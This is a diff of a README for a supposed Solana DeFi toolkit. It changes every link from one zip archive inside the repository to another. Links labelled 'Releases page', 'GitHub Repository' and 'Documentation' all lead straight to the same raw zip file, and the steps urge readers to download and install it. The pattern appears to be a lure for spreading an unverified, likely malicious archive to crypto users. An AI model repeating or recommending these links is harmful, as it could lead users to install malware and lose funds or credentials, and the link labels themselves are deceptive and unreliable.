@@ -1,6 +1,6 @@
 # 🚀 solana-defi-toolkit - Simplify Your Crypto Journey
 
-[![Download Now](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip%20Now-Visit%20Releases-blue)](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip)
+[![Download Now](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip)
 
 ## 📥 Introduction
 
@@ -26,7 +26,7 @@ Before you begin, ensure your system meets these basic requirements:
 To get started with the Solana DeFi Toolkit, follow these simple steps:
 
 1. **Download the Application**  
-   Visit our [Releases page](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip) to download the latest version of the application. Click on the version you want and download the file appropriate for your system.
+   Visit our [Releases page](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip) to download the latest version of the application. Click on the version you want and download the file appropriate for your system.
 
 2. **Install the Application**  
    After downloading, locate the file in your downloads folder.  
@@ -45,7 +45,7 @@ To get started with the Solana DeFi Toolkit, follow these simple steps:
 
 ## 🔧 Download & Install
 
-To download the Solana DeFi Toolkit, please visit our [Releases page](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip). Choose the version suitable for your operating system and follow the installation instructions provided earlier.
+To download the Solana DeFi Toolkit, please visit our [Releases page](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip). Choose the version suitable for your operating system and follow the installation instructions provided earlier.
 
 ## ❓ Frequently Asked Questions
 
@@ -88,7 +88,7 @@ We welcome contributions! If you'd like to help improve the Solana DeFi Toolkit,
 
 ## 🔗 Related Links
 
-- [GitHub Repository](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip)
-- [Documentation](https://github.com/nikeshRajbanshi231/solana-defi-toolkit/raw/refs/heads/main/src/toolkit-defi-solana-1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/nikeshRajbanshi231/solana-defi-toolkit/main/src/utils/solana_defi_toolkit_1.7-alpha.1.zip)
 
 Thank you for choosing the Solana DeFi Toolkit. Happy tracking and trading!
